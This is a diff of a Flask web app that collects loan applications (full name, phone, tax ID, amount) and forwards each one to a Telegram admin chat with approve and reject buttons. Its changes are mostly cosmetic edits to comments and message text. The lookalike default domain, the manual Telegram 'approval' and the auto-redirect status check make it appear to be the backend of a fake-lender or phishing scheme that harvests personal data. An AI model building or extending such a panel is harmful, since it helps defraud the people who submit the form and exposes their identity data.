@@ -12,7 +12,6 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
 SITE_URL = os.environ.get("SITE_URL", "https://alfakreditby.ru")
 
-# ========== БАЗА ДАННЫХ ==========
 def init_db():
     conn = sqlite3.connect('applications.db')
     c = conn.cursor()
@@ -27,7 +26,6 @@ def init_db():
 
 init_db()
 
-# ========== ОТПРАВКА В TELEGRAM ==========
 def send_to_admin(text, keyboard=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
@@ -36,22 +34,20 @@ def send_to_admin(text, keyboard=None):
     try:
         requests.post(url, json=data)
     except Exception as e:
-        print(f"Ошибка отправки: {e}")
+        print(f"Ошибка: {e}")
 
 def send_callback_answer(callback_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     requests.post(url, json={"callback_query_id": callback_id, "text": text})
 
-# ========== КЛАВИАТУРА ДЛЯ АДМИНА ==========
 def get_keyboard(session_id):
     return {
         "inline_keyboard": [
-            [{"text": "✅ Одобрить кредит", "callback_data": f"approve_credit:{session_id}"}],
-            [{"text": "❌ Отклонить", "callback_data": f"reject:{session_id}"}]
+            [{"text": "✅ ОДОБРИТЬ КРЕДИТ", "callback_data": f"approve_credit:{session_id}"}],
+            [{"text": "❌ ОТКЛОНИТЬ", "callback_data": f"reject:{session_id}"}]
         ]
     }
 
-# ========== ВЕБХУК ==========
 @app.route('/webhook', methods=['POST'])
 def webhook():
     data = request.json
@@ -62,19 +58,19 @@ def webhook():
         
         if callback_data.startswith('approve_credit:'):
             session_id = callback_data.split(':')[1]
-            send_callback_answer(callback_id, "✅ Кредит одобрен")
             
+            # ОБНОВЛЯЕМ СТАТУС В БАЗЕ
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
             c.execute('UPDATE applications SET status = "approved" WHERE session_id = ?', (session_id,))
             conn.commit()
             conn.close()
             
-            send_to_admin(f"✅ Кредит одобрен для сессии {session_id}")
+            send_callback_answer(callback_id, "✅ Кредит одобрен!")
+            send_to_admin(f"✅ Кредит ОДОБРЕН для сессии: {session_id}")
             
         elif callback_data.startswith('reject:'):
             session_id = callback_data.split(':')[1]
-            send_callback_answer(callback_id, "❌ Заявка отклонена")
             
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
@@ -82,11 +78,11 @@ def webhook():
             conn.commit()
             conn.close()
             
-            send_to_admin(f"❌ Заявка отклонена. Сессия: {session_id}")
+            send_callback_answer(callback_id, "❌ Заявка отклонена")
+            send_to_admin(f"❌ Заявка ОТКЛОНЕНА. Сессия: {session_id}")
     
     return jsonify({"status": "ok"})
 
-# ========== ПРИЁМ ЗАЯВКИ ==========
 @app.route('/submit_credit_application', methods=['POST'])
 def submit_application():
     data = request.json
@@ -101,13 +97,13 @@ def submit_application():
     conn.commit()
     conn.close()
     
-    msg = f"""🆕 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>
+    msg = f"""🆕 <b>НОВАЯ ЗАЯВКА</b>
 
-👤 ФИО: {data['fullname']}
-📱 Телефон: {data['phone']}
+👤 {data['fullname']}
+📱 {data['phone']}
 🆔 ИНН: {data.get('inn', '—')}
-💰 Сумма: {data['amount']} BYN
-📅 Срок: {data['term']} мес
+💰 {data['amount']} BYN
+📅 {data['term']} мес.
 💳 Платёж: ~{data['payment']} BYN
 
 🆔 Сессия: <code>{session_id}</code>"""
@@ -115,7 +111,6 @@ def submit_application():
     send_to_admin(msg, get_keyboard(session_id))
     return jsonify({"status": "ok", "session_id": session_id})
 
-# ========== ПОЛУЧЕНИЕ ДАННЫХ ЗАЯВКИ ==========
 @app.route('/get_application/<session_id>', methods=['GET'])
 def get_application(session_id):
     conn = sqlite3.connect('applications.db')
@@ -133,7 +128,6 @@ def get_application(session_id):
         })
     return jsonify({"error": "not found"}), 404
 
-# ========== ПРОВЕРКА СТАТУСА (ДЛЯ АВТОРЕДИРЕКТА) ==========
 @app.route('/check_status/<session_id>', methods=['GET'])
 def check_status(session_id):
     conn = sqlite3.connect('applications.db')
